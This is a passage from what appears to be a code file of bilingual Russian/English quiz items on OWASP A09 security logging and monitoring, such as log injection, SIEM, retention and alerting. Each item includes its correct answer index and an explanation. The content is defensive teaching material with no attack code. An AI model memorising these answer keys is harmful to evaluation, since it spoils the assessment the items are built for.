        e: M('OWASP требует логировать аудируемые security-события: успешные и неудачные логины, отказы авторизации, критичные серверные ошибки и явно вредоносный ввод (например, SQLi/XSS payload\'ы).', 'OWASP requires logging auditable security events: successful and failed logins, authorization denials, high-severity server errors, and clearly malicious inputs (e.g. SQLi/XSS payloads).'),
      },
      {
        q: M('Что из перечисленного НЕЛЬЗЯ записывать в лог в открытом виде согласно best practice?', 'Which of the following must NOT be logged in plaintext per best practice?'),
        opts: [
          M('Пароли, токены, номера карт — чувствительные данные', 'Passwords, tokens, card numbers — sensitive data'),
          M('User ID', 'User ID'),
          M('IP-адрес', 'IP address'),
          M('Timestamp события', 'Event timestamp'),
        ],
        ans: 0,
        e: M('Пароли, токены и номера карт в открытом виде в логах создают утечку чувствительных данных и нарушают best practice; в лог пишут факт события и безопасный контекст, не секреты.', 'Plaintext passwords, tokens, and card numbers in logs create sensitive-data exposure and violate best practice; log the event and safe context, never secrets.'),
      },
      {
        q: M('Log injection (через CRLF-последовательности в полях, попадающих в лог) может привести к:', 'Log injection (via CRLF sequences in fields that end up in a log) can lead to:'),
        opts: [
          M('DoS через переполнение буфера', 'DoS via buffer overflow'),
          M('подделке записей лога — внедрению фальшивых строк, искажающих forensics-анализ', 'forging log entries — injecting fake lines that distort forensic analysis'),
          M('SQL-инъекции в БД', 'SQL injection in a DB'),
          M('утечке памяти', 'memory leaks'),
        ],
        ans: 1,
        e: M('CRLF в пользовательских полях может разбить запись и внедрить фальшивые строки, искажая forensics и скрывая реальную активность атакующего.', 'CRLF in user-controlled fields can split a log line and inject forged entries, distorting forensics and hiding the attacker\'s real activity.'),
      },
      {
        q: M('SIEM (Security Information and Event Management) используется для:', 'A SIEM (Security Information and Event Management) is used to:'),
        opts: [
          M('хранения паролей', 'store passwords'),
          M('генерации сертификатов', 'generate certificates'),
          M('централизации, корреляции и анализа логов из множества источников с целью обнаружения инцидентов и алертинга', 'centralize, correlate, and analyze logs from multiple sources to detect incidents and drive alerting'),
          M('шифрования данных', 'encrypt data'),
        ],
        ans: 2,
        e: M('SIEM централизует логи из многих источников, коррелирует их и запускает алертинг — именно это превращает сырые записи в обнаружение инцидентов.', 'A SIEM centralizes logs from many sources, correlates them, and drives alerting — turning raw records into incident detection.'),
      },
      {
        q: M('Почему хранение логов только локально на скомпрометированном сервере — плохая практика?', 'Why is storing logs only locally on a compromised server a bad practice?'),
        opts: [
          M('Локальные логи всегда быстрее', 'Local logs are always faster'),
          M('Не имеет значения для безопасности', 'It has no bearing on security'),
          M('Занимает много места', 'It takes up a lot of space'),
          M('Атакующий, получивший контроль над сервером, может удалить/модифицировать локальные логи, уничтожая улики (anti-forensics)', 'An attacker who gains control of the server can delete/modify local logs, destroying evidence (anti-forensics)'),
        ],
        ans: 3,
        e: M('Локальные логи на скомпрометированном хосте атакующий может стереть или изменить, уничтожив улики; централизация и защита целостности этому противодействуют.', 'Local logs on a compromised host can be deleted or altered by the attacker, destroying evidence; centralization and integrity controls counter that anti-forensic step.'),
      },
      {
        q: M('Согласно OWASP-примеру, если DAST-сканирование/пентест не генерирует заметных алертов в системе мониторинга — это указывает на:', 'Per an OWASP example, if a DAST scan/pentest doesn\'t generate noticeable alerts in the monitoring system, this indicates:'),
        opts: [
          M('провал самого мониторинга/алертинга — активная атака должна быть замечена', 'a failure of the monitoring/alerting itself — active attacks should be noticed'),
          M('избыточное логирование', 'excessive logging'),
          M('неправильную настройку сканера всегда, а не проблему мониторинга', 'always a misconfigured scanner, not a monitoring problem'),
          M('отличную защиту от сканеров', 'excellent defense against scanners'),
        ],
        ans: 0,
        e: M('Активный DAST/пентест имитирует атаку; отсутствие заметных алертов — сам по себе finding по A09: система не замечает реальную вредоносную активность.', 'Active DAST/pentesting simulates attack traffic; missing noticeable alerts is itself an A09 finding — the system fails to notice real malicious activity.'),
      },
      {
        q: M('NIST 800-61r2 — это документ, посвящённый:', 'NIST 800-61r2 is a document dedicated to:'),
        opts: [
          M('шифрованию', 'encryption'),
          M('руководству по реагированию на инциденты (incident response)', 'incident response guidance'),
          M('паролям', 'passwords'),
          M('архитектуре микросервисов', 'microservice architecture'),
        ],
        ans: 1,
        e: M('NIST SP 800-61r2 — стандартное руководство по incident response; OWASP ссылается на него для playbook\'ов и учений в контексте A09.', 'NIST SP 800-61r2 is the standard incident-response guidance; OWASP points to it for playbooks and drills under A09.'),
      },
      {
        q: M('Почему достаточный контекст в логе (user id, timestamp, IP, trace id) важен для forensics?', 'Why does sufficient context in a log entry (user id, timestamp, IP, trace id) matter for forensics?'),
        opts: [
          M('Требуется только для GDPR-комплаенса', 'Only required for GDPR compliance'),
          M('Контекст замедляет систему без пользы', 'Context slows the system down with no benefit'),
          M('Без контекста невозможно восстановить полную цепочку событий инцидента и связать разрозненные записи логов в единую картину атаки', 'Without context, it\'s impossible to reconstruct the full chain of events in an incident and link disparate log entries into a single picture of an attack'),
          M('Не имеет значения, достаточно факта записи', 'It doesn\'t matter, just the fact of recording is enough'),
        ],
        ans: 2,
        e: M('User id, timestamp, IP и trace id связывают разрозненные записи в цепочку атаки; без контекста forensics и timeline расследования невозможны.', 'User id, timestamp, IP, and trace id link sparse records into an attack chain; without that context, forensics and an incident timeline are not feasible.'),
      },
      {
        q: M('Что из перечисленного — правильный подход к формату логов для защиты от log injection?', 'Which of the following is a correct approach to log format for protecting against log injection?'),
        opts: [
          M('Хранение логов в виде HTML для удобства просмотра', 'Storing logs as HTML for convenient viewing'),
          M('Свободный текстовый формат без экранирования', 'Free-text format with no escaping'),
          M('Логирование без временных меток для экономии места', 'Logging without timestamps to save space'),
          M('Структурированное логирование (например, JSON) с экранированием пользовательского ввода перед записью', 'Structured logging (e.g., JSON) with escaping of user input before it\'s written'),
        ],
        ans: 3,
        e: M('Структурированные логи (JSON и т.п.) с экранированием пользовательского ввода мешают CRLF/log injection и делают разбор/корреляцию надёжнее.', 'Structured logs (e.g. JSON) with escaped user input resist CRLF/log injection and make parsing and correlation more reliable.'),
      },
      {
        q: M('Почему логи должны быть защищены от модификации/удаления даже правами самого приложения (append-only/централизованное хранилище)?', 'Why should logs be protected from modification/deletion even by the application\'s own permissions (append-only/centralized storage)?'),
        opts: [
          M('Если скомпрометированный процесс приложения имеет права на удаление собственных логов, атакующий может замести следы после компрометации', 'If a compromised application process has rights to delete its own logs, an attacker can cover their tracks post-compromise'),
          M('Требуется только для банковской отрасли', 'Only required in the banking sector'),
          M('Логи никогда не удаляются программно', 'Logs are never programmatically deleted'),
          M('Не имеет значения при использовании HTTPS', 'It doesn\'t matter when HTTPS is used'),
        ],
        ans: 0,
        e: M('Если процесс приложения может удалять свои логи, после компрометации атакующий заместит следы; нужны append-only/WORM и/или вынос логов за пределы прав приложения.', 'If the app process can delete its own logs, post-compromise the attacker covers tracks; use append-only/WORM storage and/or ship logs beyond the app\'s privileges.'),
      },
      {
        q: M('Что из перечисленного — пример недостаточного alerting, даже при наличии полного логирования?', 'Which of the following is an example of insufficient alerting, even with complete logging in place?'),
        opts: [
          M('Логи содержат timestamp', 'Logs include a timestamp'),
          M('Логи собираются в SIEM, но пороги/правила для автоматического уведомления о аномалиях (например, множественные неудачные логины) не настроены', 'Logs are collected in a SIEM, but thresholds/rules for automatic anomaly notification (e.g., multiple failed logins) aren\'t configured'),
          M('Логи хранятся 90 дней', 'Logs are retained for 90 days'),
          M('Логи структурированы в JSON', 'Logs are structured as JSON'),
        ],
        ans: 1,
        e: M('Полный сбор логов в SIEM без правил и порогов алертинга — это пассивное хранилище: аномалии (например, брутфорс) никто не уведомляет вовремя.', 'Full SIEM ingestion without alert rules and thresholds is passive storage: anomalies such as brute force never notify anyone in time.'),
      },
      {
        q: M('Почему компания может не обнаруживать активный инцидент неделями/месяцами при слабом A09?', 'Why might a company fail to detect an active incident for weeks/months given weak A09 practices?'),
        opts: [
          M('Относится только к малому бизнесу', 'Only relevant to small businesses'),
          M('Инциденты всегда обнаруживаются мгновенно', 'Incidents are always detected instantly'),
          M('Без эффективного мониторинга и алертинга в реальном времени, признаки атаки остаются незамеченными в накопленных, но непроанализированных логах, пока не проявится явный ущерб', 'Without effective real-time monitoring and alerting, signs of an attack remain unnoticed in logs that were accumulated but never analyzed, until visible damage appears'),
          M('Это невозможно технически', 'It\'s technically impossible'),
        ],
        ans: 2,
        e: M('При слабом мониторинге и алертинге признаки атаки лежат в непросмотренных логах неделями/месяцами, пока ущерб не станет очевидным — типичный провал A09.', 'With weak monitoring and alerting, attack indicators sit in unreviewed logs for weeks or months until damage is obvious — a classic A09 failure.'),
      },
      {
        q: M('Что из перечисленного НЕ должно логироваться в открытом виде из соображений приватности/безопасности, но само событие (факт попытки) должно фиксироваться?', 'Which of the following should NOT be logged in plaintext for privacy/security reasons, while the fact of the attempt itself should still be recorded?'),
        opts: [
          M('IP-адрес атакующего', 'The attacker\'s IP address'),
          M('Факт неудачной попытки логина (сам факт — да, логируем)', 'The fact of a failed login attempt (the fact itself — yes, log it)'),
          M('Timestamp попытки', 'The timestamp of the attempt'),
          M('Сам вводимый пароль при неудачной попытке (содержимое пароля — нет, не логируем)', 'The actual password entered during a failed attempt (content of the password — no, don\'t log it)'),
        ],
        ans: 3,
        e: M('Факт неудачного логина нужно фиксировать, но сам введённый пароль логировать нельзя: это секрет и риск утечки/повторного использования.', 'Record the failed-login fact, but never the password that was typed: it is a secret and a leakage/reuse risk.'),
      },
      {
        q: M('Playbook и regular drills (учения) для incident response относятся к рекомендациям A09, потому что:', 'Playbooks and regular drills for incident response relate to A09 recommendations because:'),
        opts: [
          M('эффективное реагирование на обнаруженный через логи/алерты инцидент требует заранее отработанного процесса, а не только факта его обнаружения', 'effective response to an incident discovered via logs/alerts requires a pre-rehearsed process, not just the fact of detection'),
          M('Playbook заменяет необходимость логирования', 'A playbook replaces the need for logging'),
          M('не связаны с логированием напрямую', 'they\'re unrelated to logging directly'),
          M('Drills требуются только для военных организаций', 'Drills are only required for military organizations'),
        ],
        ans: 0,
        e: M('Обнаружение через логи/алерты бесполезно без отработанного IR-процесса; playbook\'и и drills обеспечивают быструю и согласованную реакцию.', 'Detection via logs/alerts is useless without a rehearsed IR process; playbooks and drills enable fast, consistent response.'),
      },
      {
        q: M('Что из перечисленного — пример «alert fatigue», снижающего эффективность A09 на практике?', 'Which of the following is an example of "alert fatigue" that reduces A09\'s practical effectiveness?'),
        opts: [
          M('Относится только к небольшим командам', 'It only applies to small teams'),
          M('Чрезмерное количество низкоприоритетных/ложных срабатываний приводит к тому, что аналитики игнорируют или пропускают действительно критичные алерты среди шума', 'An excessive volume of low-priority/false-positive alerts leads analysts to ignore or miss genuinely critical alerts amid the noise'),
          M('Слишком мало алертов', 'Too few alerts'),
          M('Alert fatigue не является реальной проблемой', 'Alert fatigue isn\'t a real problem'),
        ],
        ans: 1,
        e: M('Alert fatigue — когда шум ложных/низкоприоритетных алертов заставляет аналитиков пропускать реально критичные события, снижая ценность A09.', 'Alert fatigue is when noise from false or low-priority alerts causes analysts to miss truly critical events, undercutting A09\'s value.'),
      },
      {
        q: M('Почему трассировочный идентификатор (trace ID / correlation ID), проходящий через все микросервисы одного запроса, важен для логирования в распределённых системах?', 'Why does a trace ID / correlation ID that follows a single request across all microservices matter for logging in distributed systems?'),
        opts: [
          M('Trace ID используется только для дебага производительности, не для security', 'A trace ID is only used for performance debugging, not security'),
          M('Не имеет значения для микросервисной архитектуры', 'It\'s unrelated to microservice architecture'),
          M('Позволяет связать разрозненные логи из разных сервисов в единую цепочку событий одного запроса/транзакции для расследования инцидента', 'It lets you link scattered logs from different services into a single event chain for one request/transaction during an incident investigation'),
          M('Замедляет обработку запроса критично', 'It significantly slows down request processing'),
        ],
        ans: 2,
        e: M('Единый correlation/trace ID проходит через микросервисы одного запроса и склеивает их логи в одну транзакционную цепочку для расследования.', 'A shared correlation/trace ID spans microservices for one request and stitches their logs into a single transactional chain for investigation.'),
      },
      {
        q: M('Согласно OWASP, приложение должно быть способно:', 'Per OWASP, the application should be able to:'),
        opts: [
          M('только логировать события пассивно', 'only passively log events'),
          M('логировать события только раз в день пакетно', 'log events only once a day in a batch'),
          M('отключать логирование при высокой нагрузке для производительности', 'disable logging under high load for performance'),
          M('обнаруживать, эскалировать и сигнализировать об активной атаке в реальном времени, а не только вести пассивный лог для последующего анализа', 'detect, escalate, and signal an active attack in real time, not just keep a passive log for later analysis'),
        ],
        ans: 3,
        e: M('OWASP ожидает, что приложение не только пишет пассивный лог, но умеет в реальном времени обнаруживать, эскалировать и сигнализировать об активной атаке.', 'OWASP expects the application not only to keep a passive log but to detect, escalate, and signal an active attack in real time.'),
      },
      {
        q: M('Что из перечисленного — пример события, обязательного для логирования согласно OWASP A09, но часто упускаемого?', 'Which of the following is an example of an event that must be logged per OWASP A09, but is often overlooked?'),
        opts: [
          M('Изменение прав доступа/роли пользователя администратором', 'A change to a user\'s access rights/role by an administrator'),
          M('Загрузка CSS-файла', 'Loading a CSS file'),
          M('Успешная загрузка изображения', 'A successful image upload'),
          M('Просмотр страницы FAQ', 'Viewing an FAQ page'),
        ],
        ans: 0,
        e: M('Смена роли/прав администратором — критичное аудируемое событие; без лога сложно расследовать privilege abuse и несанкционированное повышение прав.', 'Admin changes to roles/permissions are critical audit events; without logs, privilege abuse and unauthorized elevation are hard to investigate.'),
      },
      {
        q: M('Почему централизация логов (а не хранение только на исходном сервере) критична для расследования масштабных инцидентов, затрагивающих несколько систем?', 'Why is centralizing logs (rather than storing them only on the originating server) critical for investigating large-scale incidents spanning multiple systems?'),
        opts: [
          M('Требуется только для облачных приложений', 'Only required for cloud applications'),
          M('Позволяет коррелировать события между разными системами и получить целостную картину атаки, распространившейся по инфраструктуре', 'It allows correlating events across different systems for a complete picture of an attack that spread across the infrastructure'),
          M('Централизация не имеет значения', 'Centralization doesn\'t matter'),
          M('Централизованные логи всегда занимают меньше места', 'Centralized logs always take up less space'),
        ],
        ans: 1,
        e: M('Централизация позволяет коррелировать события с разных хостов/сервисов и видеть lateral movement и масштаб атаки, чего не даёт разрозненное локальное хранение.', 'Centralization correlates events across hosts/services and reveals lateral movement and attack scope, which siloed local storage cannot.'),
      },
      {
        q: M('Что из перечисленного — правильный подход к retention policy (сроку хранения) логов безопасности?', 'Which of the following is the correct approach to a retention policy for security logs?'),
        opts: [
          M('Никогда не удалять логи вообще, без ограничений', 'Never delete logs at all, without limit'),
          M('Хранить логи ровно 1 день для экономии места', 'Keep logs for exactly 1 day to save space'),
          M('Хранить достаточно долго для покрытия типичного времени обнаружения инцидента (dwell time), сбалансированно с требованиями хранения данных и стоимостью', 'Keep them long enough to cover typical incident-detection time (dwell time), balanced against data-retention requirements and storage cost'),
          M('Retention policy не имеет значения для безопасности', 'Retention policy has no bearing on security'),
        ],
        ans: 2,
        e: M('Retention должен перекрывать типичный dwell time до обнаружения, но учитывать compliance и стоимость хранения — баланс, а не «хранить вечно» или «удалять сразу».', 'Retention must cover typical dwell time until detection while balancing compliance and storage cost — neither forever nor immediate deletion.'),
      },
      {
        q: M('Атакующий, зная, что определённые действия (например, массовое скачивание данных) не логируются, может использовать это для:', 'An attacker who knows certain actions (e.g., bulk data downloads) aren\'t logged can use this to:'),
        opts: [
          M('невозможно использовать в атаке', 'it can\'t be used in an attack'),
          M('ускорения атаки технически', 'speed up the attack technically'),
          M('обхода TLS', 'bypass TLS'),
          M('незаметной эксфильтрации данных без обнаружения, так как отсутствие логирования = отсутствие следа для последующего расследования', 'exfiltrate data undetected, since the absence of logging means the absence of a trail for later investigation'),
        ],
        ans: 3,
        e: M('Знание о «слепых зонах» логирования позволяет эксфильтрировать данные без записи, а значит без детекции и forensics-следа.', 'Knowing logging blind spots lets an attacker exfiltrate data with no record, hence no detection trail and no forensics trail.'),
      },
      {
        q: M('Почему WAF/IDS алерты должны интегрироваться в общий SIEM, а не рассматриваться изолированно?', 'Why should WAF/IDS alerts be integrated into a common SIEM rather than treated in isolation?'),
        opts: [
          M('Корреляция сетевых/периметровых алертов с логами приложения даёт более полную картину атаки и снижает вероятность пропуска связанных событий', 'Correlating perimeter/network alerts with application logs gives a fuller picture of an attack and reduces the chance of missing related events'),
          M('WAF-алерты не связаны с application-логами', 'WAF alerts are unrelated to application logs'),
          M('Интеграция замедляет обработку алертов', 'Integration slows alert processing'),
          M('Не имеет практического значения', 'It has no practical significance'),
        ],
        ans: 0,
        e: M('Интеграция WAF/IDS в SIEM связывает периметровые сигналы с app-логами, даёт полную картину атаки и снижает пропуски связанных событий.', 'Feeding WAF/IDS into the SIEM links perimeter signals with app logs, yields a fuller attack picture, and cuts missed related events.'),
      },
      {
        q: M('Что из перечисленного описывает разницу между «logging» и «monitoring/alerting» как двумя частями категории?', 'Which of the following describes the difference between "logging" and "monitoring/alerting" as the category\'s two parts?'),
        opts: [
          M('Monitoring относится только к производительности, не к безопасности', 'Monitoring only relates to performance, not security'),
          M('Logging — запись событий; monitoring/alerting — активный анализ этих записей в реальном (или близком к реальному) времени с уведомлением о значимых событиях', 'Logging is recording events; monitoring/alerting is actively analyzing those records in (near) real time with notification of significant events'),
          M('Alerting не требует предварительного логирования', 'Alerting doesn\'t require prior logging'),
          M('Это одно и то же понятие', 'They\'re the same concept'),
        ],
        ans: 1,
        e: M('Logging — это запись событий; monitoring/alerting — активный (near) real-time анализ этих записей с уведомлением о значимых отклонениях.', 'Logging is recording events; monitoring/alerting is actively analyzing those records in near real time and notifying on significant events.'),
      },
      {
        q: M('Согласно OWASP, для эффективной защиты через A09 организации нужен:', 'Per OWASP, effective A09 protection requires an organization to have:'),
        opts: [
          M('только факт наличия логов на диске', 'just the fact that logs exist on disk'),
          M('отключение логирования для повышения производительности', 'disabled logging to improve performance'),
          M('эффективный incident response план, использующий логи/алерты как входные данные для обнаружения, расследования и реагирования', 'an effective incident-response plan that uses logs/alerts as input for detection, investigation, and response'),
          M('только антивирус', 'only antivirus'),
        ],
        ans: 2,
        e: M('Эффективный A09 включает IR-план, где логи и алерты — вход для detection, investigation и response, а не самоцель.', 'Effective A09 includes an IR plan that treats logs and alerts as inputs to detection, investigation, and response, not an end in themselves.'),
      },
      {
        q: M('Что из перечисленного — пример недостаточного логирования, специфичного для API?', 'Which of the following is an example of insufficient logging specific to APIs?'),
        opts: [
          M('Логирование timestamp запроса', 'Logging the request timestamp'),
          M('Логирование метода запроса', 'Logging the request method'),
          M('Логирование каждого успешного GET-запроса без исключений (избыточно, но не риск)', 'Logging every successful GET request without exception (excessive, but not a risk)'),
          M('Отсутствие логирования отказов авторизации (403) и rate-limit срабатываний на API-эндпоинтах', 'Not logging authorization denials (403) and rate-limit triggers on API endpoints'),
        ],
        ans: 3,
        e: M('Для API особенно важны логи 403 (отказы авторизации) и срабатываний rate limit — они часто сигнализируют о probing и abuse API.', 'For APIs, logging 403 authorization denials and rate-limit hits is especially important — they often signal probing and API abuse.'),
      },
      {
        q: M('Почему security-логи не должны напрямую отображаться конечному пользователю (например, в UI ошибки)?', 'Why shouldn\'t security logs be displayed directly to the end user (e.g., in an error UI)?'),
        opts: [
          M('Раскрытие внутренних деталей логирования атакующему через UI может дать разведывательную информацию о внутренней структуре системы', 'Exposing internal logging details to an attacker via the UI can give them reconnaissance information about the internal system structure'),
          M('Не имеет значения', 'It doesn\'t matter'),
          M('Логи всегда безопасно показывать всем', 'It\'s always safe to show logs to everyone'),
          M('Это требование эстетики UI', 'It\'s just a UI aesthetics requirement'),
        ],
        ans: 0,
        e: M('Показ security-логов/внутренних деталей в UI отдаёт атакующему разведданные о структуре системы; пользователю — безопасное обобщённое сообщение.', 'Exposing security logs or internal details in the UI hands recon data to an attacker; give users a safe, generic message only.'),
      },
      {
        q: M('Что из перечисленного — пример «false negative» в контексте алертинга (наиболее опасный тип ошибки для A09)?', 'Which of the following is an example of a "false negative" in alerting (the most dangerous error type for A09)?'),
        opts: [
          M('Алерт сработал на легитимную активность (false positive)', 'An alert fired on legitimate activity (false positive)'),
          M('Реальная атака произошла, но не сгенерировала алерт из-за недостаточного покрытия/порогов правил детекции', 'A real attack occurred but didn\'t generate an alert due to insufficient coverage/thresholds in the detection rules'),
          M('Логи были записаны корректно', 'Logs were recorded correctly'),
          M('Алерт сработал вовремя и корректно', 'An alert fired correctly and on time'),
        ],
        ans: 1,
        e: M('False negative — реальная атака без алерта из-за дыр в правилах/порогах; для A09 это опаснее шума, потому что инцидент вообще не замечают.', 'A false negative is a real attack with no alert due to gaps in rules/thresholds; for A09 it is worse than noise because the incident is never seen.'),
      },
      {
        q: M('Почему масштаб/детализация логирования должны быть сбалансированы (не логировать абсолютно всё без разбора)?', 'Why should logging scope/detail be balanced (not logging absolutely everything indiscriminately)?'),
        opts: [
          M('Логирование не требует ресурсов', 'Logging doesn\'t consume resources'),
          M('Баланс не имеет отношения к безопасности', 'Balance has no bearing on security'),
          M('Чрезмерное, неструктурированное логирование увеличивает шум, затрудняет анализ, увеличивает затраты на хранение и может само создавать риск утечки чувствительных данных', 'Excessive, unstructured logging increases noise, hampers analysis, increases storage costs, and can itself create a risk of sensitive-data leakage'),
          M('Не имеет значения, чем больше логов, тем лучше всегда', 'It doesn\'t matter, more logs are always better'),
        ],
        ans: 2,
        e: M('Логировать «всё подряд» создаёт шум, удорожает хранение, усложняет анализ и повышает риск утечки PII/секретов; нужна сбалансированная детализация.', 'Logging everything creates noise, storage cost, analysis drag, and PII/secret leakage risk; balance detail with purpose.'),
      },
      {
        q: M('Что из перечисленного — пример события, требующего немедленного (real-time) алертинга, а не только последующего batch-анализа?', 'Which of the following is an example of an event requiring immediate (real-time) alerting, not just later batch analysis?'),
        opts: [
          M('Просмотр публичной статьи блога', 'Viewing a public blog article'),
          M('Запрос статичного CSS-файла', 'A request for a static CSS file'),
          M('Успешная загрузка изображения профиля', 'A successful profile-picture upload'),
          M('Множественные последовательные неудачные попытки логина с одного IP за короткий промежуток времени (признак брутфорса)', 'Multiple consecutive failed login attempts from a single IP within a short window (a sign of brute-forcing)'),
        ],
        ans: 3,
        e: M('Пачка неудачных логинов с одного IP за короткое время — признак брутфорса и требует real-time алерта, а не отложенного batch-разбора.', 'Many failed logins from one IP in a short window signal brute force and need real-time alerting, not deferred batch review.'),
      },
      {
        q: M('Honeypot/canary token в контексте логирования и алертинга используется для:', 'A honeypot/canary token in the context of logging and alerting is used to:'),
        opts: [
          M('обнаружения несанкционированного доступа/эксфильтрации через срабатывание при взаимодействии с заведомо «приманочными» данными/ресурсами, которые легитимный пользователь никогда не должен трогать', 'detect unauthorized access/exfiltration by firing when someone interacts with deliberately placed "decoy" data/resources a legitimate user should never touch'),
          M('ускорения сервера', 'speed up the server'),
          M('генерации паролей', 'generate passwords'),
          M('шифрования данных', 'encrypt data'),
        ],
        ans: 0,
        e: M('Honeypot/canary срабатывает при касании «приманочных» ресурсов, которые легитимный пользователь не трогает, — это высокодостоверный сигнал несанкционированного доступа.', 'A honeypot/canary fires when decoy resources that legitimate users never touch are accessed — a high-fidelity signal of unauthorized activity.'),
      },
      {
        q: M('Почему «логирование факта отказа доступа» (403 Forbidden) важно так же, как логирование успешных действий?', 'Why does "logging the fact of an access denial" (403 Forbidden) matter just as much as logging successful actions?'),
        opts: [
          M('Отказы доступа не представляют интереса для безопасности', 'Access denials are of no security interest'),
          M('Повторяющиеся отказы доступа могут указывать на активную попытку атаки (сканирование/подбор прав), которую важно обнаружить до успешной эксплуатации', 'Repeated access denials can indicate an active attack attempt (scanning/permission probing) that\'s important to catch before successful exploitation'),
          M('Достаточно логировать только успешные действия', 'It\'s sufficient to log only successful actions'),
          M('Логирование отказов замедляет сервер критично', 'Logging denials slows down the server significantly'),
        ],
        ans: 1,
        e: M('Повторяющиеся отказы доступа могут быть сканированием/probing прав; их логирование и алертинг помогают поймать атаку до успешной эксплуатации.', 'Repeated access denials can be permission scanning/probing; logging and alerting on them help catch attacks before successful exploitation.'),
      },
      {
        q: M('Что из перечисленного — правильная практика хранения security-логов с точки зрения защиты целостности (integrity, пересекается с A08)?', 'Which of the following is a correct security-log storage practice for protecting integrity (overlapping with A08)?'),
        opts: [
          M('Хранение только в оперативной памяти без персистентности', 'Storing them only in RAM, without persistence'),
          M('Логи не требуют защиты целостности', 'Security logs don\'t require integrity protection'),
          M('Хранение в append-only/WORM (write-once-read-many) хранилище или с криптографической цепочкой хешей для обнаружения модификации задним числом', 'Storing them in append-only/WORM (write-once-read-many) storage or with a cryptographic hash chain to detect after-the-fact tampering'),
          M('Хранение в изменяемой (mutable) БД без контроля доступа', 'Storing them in a mutable DB with no access control'),
        ],
        ans: 2,
        e: M('Append-only/WORM или hash-chain защищают целостность логов: постфактум-подделка становится обнаруживаемой, что пересекается с целями A08.', 'Append-only/WORM or hash-chain storage protects log integrity so after-the-fact tampering is detectable, overlapping A08 goals.'),
      },
      {
        q: M('Согласно OWASP, недостаточное логирование чаще всего обнаруживается организацией:', 'Per OWASP, insufficient logging is most often discovered by an organization:'),
        opts: [
          M('через регулярные пресс-релизы', 'via regular press releases'),
          M('сразу при разработке через unit-тесты', 'immediately during development, via unit tests'),
          M('никогда не обнаруживается', 'it\'s never discovered'),
          M('постфактум, во время расследования уже произошедшего инцидента, когда выясняется отсутствие нужных данных для анализа', 'after the fact, while investigating an incident that already happened, when the needed data turns out to be missing'),
        ],
        ans: 3,
        e: M('Недостаточное логирование чаще вскрывается уже после инцидента, когда нужных данных для расследования нет — типичный «post-mortem» discovery A09.', 'Insufficient logging is most often found after an incident, when investigation data is missing — the classic A09 post-mortem discovery.'),
      },
      {
        q: M('Что из перечисленного описывает «недостаточная гранулярность» логирования как проблему?', 'Which of the following describes "insufficient granularity" in logging as a problem?'),
        opts: [
          M('Лог фиксирует только факт «ошибка произошла» без указания, какая именно ошибка, где, с какими параметрами — недостаточно для расследования', 'A log entry records only the fact "an error occurred" without specifying which error, where, or with what parameters — insufficient for investigation'),
          M('Лог содержит слишком много деталей', 'A log entry contains too much detail'),
          M('Требуется логировать только успешные операции', 'Only successful operations need to be logged'),
          M('Гранулярность не влияет на полезность лога', 'Granularity doesn\'t affect a log\'s usefulness'),
        ],
        ans: 0,
        e: M('Запись «произошла ошибка» без типа, места и параметров бесполезна для расследования — это insufficient granularity.', 'Logging only "an error occurred" without type, location, or parameters is useless for investigation — that is insufficient granularity.'),
      },
      {
        q: M('Почему интеграция threat intelligence фидов с SIEM повышает эффективность алертинга согласно современным практикам A09?', 'Why does integrating threat-intelligence feeds with a SIEM improve alerting effectiveness per current A09 practice?'),
        opts: [
          M('Замедляет обработку логов без пользы', 'It slows down log processing with no benefit'),
          M('Позволяет автоматически сопоставлять внутренние логи с известными индикаторами компрометации (IOC) — IP, хеши, домены — для более быстрого обнаружения известных угроз', 'It lets you automatically match internal logs against known indicators of compromise (IOCs) — IPs, hashes, domains — for faster detection of known threats'),
          M('Threat intelligence не связан с логированием', 'Threat intelligence is unrelated to logging'),
          M('Требуется только для государственных организаций', 'Only required for government organizations'),
        ],
        ans: 1,
        e: M('Threat-intelligence feeds сопоставляют логи с известными IOC (IP, хеши, домены) и ускоряют детект известных угроз в SIEM.', 'Threat-intelligence feeds match logs against known IOCs (IPs, hashes, domains) and speed detection of known threats in the SIEM.'),
      },
      {
        q: M('Что из перечисленного — пример корректной обработки чувствительных данных при логировании ошибки валидации формы?', 'Which of the following is an example of correctly handling sensitive data when logging a form-validation error?'),
        opts: [
          M('Не логировать ошибку валидации вообще', 'Not logging the validation error at all'),
          M('Логировать введённый пользователем пароль в открытом виде для дебага', 'Logging the user\'s entered password in plaintext for debugging'),
          M('Логировать факт ошибки валидации и маскированное/усечённое значение (например, только последние 4 цифры карты), не полное чувствительное значение', 'Logging the fact of the validation error and a masked/truncated value (e.g., only the last 4 digits of a card), not the full sensitive value'),
          M('Логировать только timestamp без деталей', 'Logging only a timestamp with no details'),
        ],
        ans: 2,
        e: M('При ошибке валидации логируют факт и маскированные/усечённые значения (например, last4 карты), а не полные секреты.', 'On validation errors, log the fact and masked/truncated values (e.g. card last4), never full secrets.'),
      },
      {
        q: M('Почему «время до обнаружения» (Mean Time to Detect, MTTD) — ключевая метрика эффективности категории A09?', 'Why is "Mean Time to Detect" (MTTD) a key effectiveness metric for category A09?'),
        opts: [
          M('MTTD измеряется только для инфраструктурных сбоев, не для security', 'MTTD is measured only for infrastructure outages, not security'),
          M('MTTD не связан с логированием/алертингом', 'MTTD is unrelated to logging/alerting'),
          M('MTTD не поддаётся измерению', 'MTTD can\'t be measured'),
          M('Низкий MTTD напрямую отражает, насколько быстро логирование+алертинг позволяют организации заметить инцидент, что критично для ограничения ущерба', 'A low MTTD directly reflects how quickly logging+alerting let an organization notice an incident, which is critical for limiting damage'),
        ],
        ans: 3,
        e: M('MTTD показывает, насколько быстро logging+alerting позволяют заметить инцидент; низкий MTTD критичен для ограничения ущерба.', 'MTTD measures how quickly logging and alerting let you notice an incident; a low MTTD is critical to limiting damage.'),
      },
      {
        q: M('Что из перечисленного — верный пример «недостаточной эскалации» обнаруженного алерта?', 'Which of the following is a valid example of "insufficient escalation" of a detected alert?'),
        opts: [
          M('Алерт сгенерирован, но попадает в очередь из тысяч непросмотренных уведомлений без приоритизации и SLA на реагирование', 'An alert is generated but sits in a queue of thousands of unreviewed notifications with no prioritization or response SLA'),
          M('Алерт полностью автоматически устраняет угрозу без участия человека', 'An alert fully and automatically remediates the threat with no human involvement'),
          M('Алерт логируется и анализируется в реальном времени', 'An alert is logged and analyzed in real time'),
          M('Алерт сгенерирован и мгновенно передан дежурному аналитику с чётким приоритетом', 'An alert is generated and instantly routed to an on-call analyst with a clear priority'),
        ],
        ans: 0,
